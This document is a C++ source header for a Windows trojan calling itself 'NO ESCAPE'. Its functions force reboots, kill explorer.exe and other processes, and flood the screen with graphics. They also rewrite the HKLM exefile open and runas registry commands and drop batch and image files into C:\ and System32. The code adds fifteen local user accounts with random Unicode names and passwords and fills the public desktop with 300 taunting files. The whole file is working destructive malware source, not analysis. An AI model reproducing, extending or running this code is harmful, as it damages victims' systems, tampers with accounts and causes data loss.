#pragma once
#define _CRT_SECURE_NO_WARNINGS
#pragma warning(suppress : 4996)
#include <fstream>
#include <string>
#include <direct.h>
#include <Windows.h>
#include <stdio.h> 
#include <tlhelp32.h> 
#include <tchar.h> 
#include <iostream>
#include <CommCtrl.h>
#include <winternl.h>
#include "userimages.h"
#include "main.h"
#include <Psapi.h>
#include <shlwapi.h> // Required for check file existence
#include <shlobj.h>
#include <LM.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib,"ntdll.lib")
void clean();
using namespace std;
#include <vector>
#include <random>
//BOOLEAN block = FALSE;
//BOOLEAN bonziRun = FALSE;
//BOOLEAN bonzi = FALSE;
//BOOLEAN Run = FALSE;
//BOOL bonziRunOnce = FALSE;
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
ULONG BreakOnTermination;
NTSTATUS status;
char cmd[10];
BOOLEAN tmp1;
DWORD tmp2;
BOOLEAN bl;
DWORD wb;
LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void killWindowsInstant1() {
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}
DWORD WINAPI watch(LPVOID parameter) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcess(L"C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi))
	{
		infect();
		DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
		killWindowsInstant1();
	}

	// Monitor Notepad process
	HANDLE hProcess = pi.hProcess;
	WaitForSingleObject(hProcess, INFINITE);
	CloseHandle(hProcess);
	infect();
	DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
	killWindowsInstant1();
	ExitProcess(0);
}
void simulateKeyPress1(WORD key1, WORD key2 = 0)
{
	INPUT input[2];
	ZeroMemory(input, sizeof(input));
	input[0].type = INPUT_KEYBOARD;
	input[0].ki.wScan = 0;
	input[0].ki.time = 0;
	input[0].ki.dwExtraInfo = 0;
	input[0].ki.wVk = key1;
	input[0].ki.dwFlags = 0; // 0 for key press
	if (key2 != 0) {
		input[1].type = INPUT_KEYBOARD;
		input[1].ki.wScan = 0;
		input[1].ki.time = 0;
		input[1].ki.dwExtraInfo = 0;
		input[1].ki.wVk = key2;
		input[1].ki.dwFlags = 0; // 0 for key press
	}
	SendInput(2, input, sizeof(INPUT));

	input[0].ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
	if (key2 != 0) {
		input[1].ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
	}
	SendInput(2, input, sizeof(INPUT));
}
void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	//if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
	//	__asm {
	//		push offset tmp1

	//		push byte ptr 0
	//		push byte ptr 1
	//		push dword ptr 19

	//		call RtlAdjustPrivilege

	//		push offset tmp2

	//		push dword ptr 6
	//		push dword ptr 0
	//		push dword ptr 0
	//		push dword ptr 0

	//		push dword ptr 0xc0000022

	//		call NtRaiseHardError
	//	};
	//}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}
void move() {
	HWND  hwndParent = ::FindWindowA("Progman", "Program Manager");
	HWND  hwndSHELLDLL_DefView = ::FindWindowEx(hwndParent, NULL, L"SHELLDLL_DefView", NULL);
	HWND  hwndSysListView32 = ::FindWindowEx(hwndSHELLDLL_DefView, NULL, L"SysListView32", L"FolderView");

	int Nm = ListView_GetItemCount(hwndSysListView32);

	int sNm = 360 / Nm;

	int x = 0, y = 0;
	int speedx = 30;
	int speedy = 30;
	int i = 0;
	while (true)
	{
		x += speedx;
		y += speedy;
		if (x > 1920 + 1920 - 50 / 2)
			speedx = -30;
		if (x < 0)
			speedx = 30;
		if (y > 1080 - 50 / 2)
			speedy = -30;
		if (y < 0)
			speedy = 30;

		if (i < Nm)
			i++;
		else
			i = 0;

		::SendMessage(hwndSysListView32, LVM_SETITEMPOSITION, i, MAKELPARAM(x, y));
		ListView_RedrawItems(hwndSysListView32, i, i + 1);
		//		ListView_RedrawItems(hwndSysListView32, 0, ListView_GetItemCount(hwndSysListView32) - 1);
		::UpdateWindow(hwndSysListView32);
		Sleep(50);
	}
}
void dark() {
	HDC hdc = GetDC(HWND_DESKTOP);

	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);

	while (1) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(hdc, rand() % 2, rand() % 2, rand() % sw, rand() % sh, hdc, rand() % 2, rand() % 2, SRCAND);
		Sleep(3);
	}
}
void lol();
void hello() {
	Sleep(2000);
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	PROCESSENTRY32 ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(ProcessEntry);

	BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

	if (!Return)
	{
		goto Label;
	}

	do
	{
		int value = _tcsicmp(ProcessEntry.szExeFile, _T("notepad.exe"));
		//replace the taskmgr.exe to the process u want to remove. 
		if (value == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}

	} while (Process32Next(hProcessSnapShot, &ProcessEntry));

	CloseHandle(hProcessSnapShot);
}
void simple() {
	HANDLE hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);

	PROCESSENTRY32 ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(ProcessEntry);

	BOOL Return = FALSE;
Label:Return = Process32First(hProcessSnapShot, &ProcessEntry);

	if (!Return)
	{
		goto Label;
	}

	do
	{
		int value = _tcsicmp(ProcessEntry.szExeFile, _T("explorer.exe"));
		//replace the taskmgr.exe to the process u want to remove. 
		if (value == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessEntry.th32ProcessID);
			TerminateProcess(hProcess, 0);
			CloseHandle(hProcess);
		}

	} while (Process32Next(hProcessSnapShot, &ProcessEntry));

	CloseHandle(hProcessSnapShot);
}
void userbmp1()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\user.bmp", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, userbmp, sizeof(userbmp), &dw, 0);
	CloseHandle(hFile);
}
void userpng1()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\user.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, userpng, sizeof(userpng), &dw, 0);
	CloseHandle(hFile);
}
void user321()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\user-32.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, user32, sizeof(user32), &dw, 0);
	CloseHandle(hFile);
}
void user401()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\user-40.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, user40, sizeof(user40), &dw, 0);
	CloseHandle(hFile);
}
void user481()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\user-48.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, user48, sizeof(user48), &dw, 0);
	CloseHandle(hFile);
}
void user192hex()
{

	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\user-192.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, user192, sizeof(user192), &dw, 0);
	CloseHandle(hFile);
}
void resource1()
{
	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\hello.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, rawData1, sizeof(rawData1), &dw, 0);
	CloseHandle(hFile);
}
void batfile() {
	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\hello.bat", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, batfile010, sizeof(batfile010), &dw, 0);
	CloseHandle(hFile);
}
void regfile() {
	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\Windows\\System32\\hello.reg", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, regfile1, sizeof(regfile1), &dw, 0);
	CloseHandle(hFile);
}
DWORD WINAPI Checkykey(LPVOID lpParam) {
	while (GetAsyncKeyState(0x53) == 0) {
		//sleep 
		Sleep(10);
	}
	HWND hWnd = FindWindow(NULL, L"*Untitled - Notepad");
	if (!hWnd) {
		HWND lol = FindWindow(NULL, L"Untitled - Notepad");
		HWND ok = FindWindowEx(lol, NULL, L"Edit", NULL);
		SetForegroundWindow(lol);
		SendMessage(ok, WM_CHAR, VK_SPACE, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'G', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'D', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, VK_SPACE, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'L', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'U', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'C', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'K', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'.', 0);
		hello();
		//();
		Sleep(2000);
		//ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
		ShellExecute(NULL, NULL, L"calc.exe", NULL, NULL, SW_SHOW);
		ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
		ShellExecute(NULL, NULL, L"mspaint.exe", NULL, NULL, SW_SHOW);
		for (int i = 0; i < 20; i++) {
			dark();
		}
		dark();
		Sleep(30000);
		killWindowsInstant();
	}
	HWND edit = FindWindowEx(hWnd, NULL, L"Edit", NULL);
	SetForegroundWindow(hWnd);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'G', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'K', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'.', 0);
	hello();
	//ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
	Sleep(2000);
	ShellExecute(NULL, NULL, L"calc.exe", NULL, NULL, SW_SHOW);
	ShellExecute(NULL, NULL, L"notepad.exe", NULL, NULL, SW_SHOW);
	ShellExecute(NULL, NULL, L"mspaint.exe", NULL, NULL, SW_SHOW);
	for (int i = 0; i < 20; i++) {
		dark();
	}
	dark();
	Sleep(30000);
	killWindowsInstant();

}
DWORD WINAPI Checknkey(LPVOID lpParam) {
	while (GetAsyncKeyState(0x4F) == 0) {
		//sleep 
		Sleep(10);
	}
	MessageBoxA(NULL, "", "", MB_ICONINFORMATION);
	infect();
	DeleteFileA("C:\\Windows\\System32\\noescapeexe.txt");
	killWindowsInstant();
	ExitProcess(0);
}
void extractall() {
	userpng1();
	userbmp1();
	user321();
	user401();
	user481();
	user192hex();
	resource1();
	batfile();
	//regfile();
}
void execute() {
	clean();
	HWND hWnd = FindWindow(NULL, L"*Untitled - Notepad");
	if (!hWnd) {
		HWND lol = FindWindow(NULL, L"Untitled - Notepad");
		HWND ok = FindWindowEx(lol, NULL, L"Edit", NULL);
		SetForegroundWindow(lol);
		Sleep(2);
		SendMessage(ok, WM_CHAR, VK_RETURN, 1);
		SendMessage(ok, WM_CHAR, VK_RETURN, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'G', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'O', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'D', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, VK_SPACE, 1);
		SendMessage(ok, WM_CHAR, (TCHAR)'L', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'U', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'C', 0);
		SendMessage(ok, WM_CHAR, (TCHAR)'K', 0);
		Sleep(60);
		SendMessage(ok, WM_CHAR, (TCHAR)'.', 0);
		hello();
		//();
		Sleep(2000);
		//ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
		ShellExecuteA(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOW);
		ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
		ShellExecuteA(NULL, NULL, "mspaint.exe", NULL, NULL, SW_SHOW);
		for (int i = 0; i < 20; i++) {
			dark();
		}
		dark();
		Sleep(30000);
		killWindowsInstant();
	}
	HWND edit = FindWindowEx(hWnd, NULL, L"Edit", NULL);
	SetForegroundWindow(hWnd);
	SendMessage(edit, WM_CHAR, VK_RETURN, 1);
	SendMessage(edit, WM_CHAR, VK_RETURN, 1);
	SendMessage(edit, WM_CHAR, (TCHAR)'G', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'O', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'D', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, VK_SPACE, 1);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'L', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'U', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'C', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'K', 0);
	Sleep(60);
	SendMessage(edit, WM_CHAR, (TCHAR)'.', 0);
	hello();
	//ShellExecute(NULL, NULL, L"taskkill /f /im explorer.exe", NULL, NULL, SW_HIDE);
	Sleep(2000);
	ShellExecuteA(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOW);
	ShellExecuteA(NULL, NULL, "notepad.exe", NULL, NULL, SW_SHOW);
	ShellExecuteA(NULL, NULL, "mspaint.exe", NULL, NULL, SW_SHOW);
	for (int i = 0; i < 20; i++) {
		dark();
	}
	dark();
	Sleep(30000);
	killWindowsInstant();

}
//LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
//{
//	static HHOOK hook_keys;
//
//	switch (uMsg)
//	{
//	case WM_CREATE:
//		hook_keys = SetWindowsHookEx(WH_KEYBOARD_LL,
//			LLKeyboardProc,
//			((LPCREATESTRUCT)lParam)->hInstance,
//			0);
//		return 0;
//
//	case WM_DESTROY:
//		UnhookWindowsHookEx(hook_keys);
//		PostQuitMessage(0);
//		return 0;
//
//	default:
//		return DefWindowProc(hwnd, uMsg, wParam, lParam);
//	}
//}
//
//
//LRESULT CALLBACK LLKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
//{
//	PKBDLLHOOKSTRUCT hookstruct;
//
//	if (nCode == HC_ACTION)
//	{
//		switch (wParam)
//		{
//		case WM_KEYDOWN: case WM_SYSKEYDOWN:
//		case WM_KEYUP: case WM_SYSKEYUP:
//			hookstruct = (PKBDLLHOOKSTRUCT)lParam;
//			//91
//			if (hookstruct->vkCode == 0x59) /* pesky Windows button */
//				return 1;
//			else
//				return CallNextHookEx(NULL, nCode, wParam, lParam);
//		}
//	}
//	return CallNextHookEx(NULL, nCode, wParam, lParam);
//}
void clean() {
	const char* exefile = """\"%1\" %*""";
	HKEY hkey;

	LONG retVal2 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\exefile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (~retVal2 == ERROR_SUCCESS);
	{
		RegSetValueExA(hkey, 0, 0, REG_SZ, (unsigned char*)exefile, strlen(exefile));
		printf("success!!");
	}
	LONG retVal3 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\exefile\\shell\\runas\\command", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (~retVal3 == ERROR_SUCCESS);
	{
		RegSetValueExA(hkey, 0, 0, REG_SZ, (unsigned char*)exefile, strlen(exefile));
		printf("success!!");
	}

}

int randomfiles() {
	const int numFiles = 300;
	vector<wstring> filenames;
	for (int i = 0; i < numFiles; i++) {
		// Generate random file name with random text and Unicode letters
		wstring filename;
		const int filenameLength = rand() % 10 + 5;
		for (int j = 0; j < filenameLength; j++) {
			if (rand() % 2) {
				filename += (wchar_t)(rand() % 26 + '`');
			}
			else {
				const int unicode = rand() % (0x10FFFF - 0x80) + 0x80;
				wchar_t utf16[2] = { 0 };
				utf16[0] = (wchar_t)unicode;
				filename += utf16;
			}
		}
		filename += L".";
		filenames.push_back(filename);
	}

	// Determine monitor size
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	int numColumns = screenWidth / 100;
	int numRows = screenHeight / 100;
	int numFilesToCreate = numColumns * numRows;
	if (numFilesToCreate < numFiles) {
		numFilesToCreate = numFiles;
	}

	// Create files on the desktop
	wstring desktopPath = L"C:\\Users\\Public\\Desktop\\";
	//wchar_t path[MAX_PATH];
	//SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path);
	for (int i = 0; i < numFilesToCreate; i++) {
		wstring filePath = desktopPath + filenames[i];
		wofstream file(filePath);
		file << "Your Computer is Mine you can't get rid of this trojan - NO ESCAPE\n 䁀ij丂s祣dg换䍝儌l䭒";
		file.close();
		SetFileAttributes(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
	}

	return 0;
}
void createRandomUser()
{
	// Generate random username with Unicode letters
	wstring username;
	const int usernameLength = rand() % 10 + 5;
	for (int j = 0; j < usernameLength; j++) {
		const int unicode = rand() % (0x10FFFF - 0x80) + 0x80;
		wchar_t utf16[2] = { 0 };
		if (unicode <= 0xFFFF) {
			utf16[0] = unicode;
		}
		else if (unicode <= 0x10FFFF) {
			utf16[0] = (unicode >> 10) + 0xD7C0;
			utf16[1] = (unicode & 0x3FF) + 0xDC00;
		}
		username += utf16;
	}

	// Generate random password with Unicode letters
	wstring password;
	const int passwordLength = rand() % 10 + 5;
	for (int j = 0; j < passwordLength; j++) {
		const int unicode = rand() % (0x10FFFF - 0x80) + 0x80;
		wchar_t utf16[2] = { 0 };
		if (unicode <= 0xFFFF) {
			utf16[0] = unicode;
		}
		else if (unicode <= 0x10FFFF) {
			utf16[0] = (unicode >> 10) + 0xD7C0;
			utf16[1] = (unicode & 0x3FF) + 0xDC00;
		}
		password += utf16;
	}

	// Create user account
	USER_INFO_1 userInfo;
	userInfo.usri1_name = const_cast<wchar_t*>(username.c_str());
	userInfo.usri1_password = const_cast<wchar_t*>(password.c_str());
	userInfo.usri1_priv = USER_PRIV_USER;
	userInfo.usri1_home_dir = nullptr;
	userInfo.usri1_comment = nullptr;
	userInfo.usri1_flags = UF_SCRIPT;
	userInfo.usri1_script_path = nullptr;
	NetUserAdd(nullptr, 1, reinterpret_cast<LPBYTE>(&userInfo), nullptr);
	USER_INFO_1008 userInfo1008;
	userInfo1008.usri1008_flags = UF_DONT_EXPIRE_PASSWD;
	NetUserSetInfo(nullptr, const_cast<wchar_t*>(username.c_str()), 1008, reinterpret_cast<LPBYTE>(&userInfo1008), nullptr);

	// Add user to "Users" group to make it visible on the login screen
	LOCALGROUP_MEMBERS_INFO_3 localGroupMembersInfo;
	localGroupMembersInfo.lgrmi3_domainandname = const_cast<wchar_t*>(username.c_str());
	NetLocalGroupAddMembers(nullptr, L"Users", 3, reinterpret_cast<LPBYTE>(&localGroupMembersInfo), 1);
}
void user()
{
	// Seed random number generator
	srand(GetTickCount());

	// Generate random number of users
	const int numUsers = 15;

	// Create random users
	for (int i = 0; i < numUsers; i++) {
		createRandomUser();
	}
}